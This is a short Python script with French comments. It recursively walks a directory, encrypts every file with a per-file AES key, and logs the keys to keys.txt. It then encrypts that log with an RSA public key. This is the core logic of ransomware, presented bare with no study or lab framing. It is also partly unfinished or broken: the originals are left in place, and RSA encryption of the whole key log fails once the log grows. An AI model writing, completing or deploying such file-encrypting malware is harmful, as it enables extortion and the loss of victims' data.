from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def enc_file(file_path):
    # Génération clé AES
    key = get_random_bytes(16)
    
    # Ouverture du fichier
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    # Chiffrement du contenu du fichier
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(file_data)
    
    # Sauvegarde du fichier chiffré
    enc_file_path = file_path + '.enc'
    with open(enc_file_path, 'wb') as f:
        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
    
    # Sauvegarde de la clé
    with open('keys.txt', 'a') as f:
        f.write(f'{enc_file_path}:{key.hex()}\n')

def search_dir(directory):
    for root, dirs, files in os.walk(directory):
        for ctr in files:
            file_path = os.path.join(root, ctr)
            enc_file(file_path)
    
    # Chiffrement de keys.txt
    
    # Chargement de la clé publique
    with open('key.public', 'rb') as f:
        public_key = RSA.import_key(f.read())
    
    # Chargement du contenu de keys.txt
    with open('keys.txt', 'rb') as f:
        keys_data = f.read()
    
    # Chiffrement keys.txt 
    cipher_rsa = PKCS1_OAEP.new(public_key)
    enc_keys_data = cipher_rsa.encrypt(keys_data)
    
    # Sauvegarde de keys.txt chiffré
    with open('keys.txt.enc', 'wb') as f:
        f.write(enc_keys_data)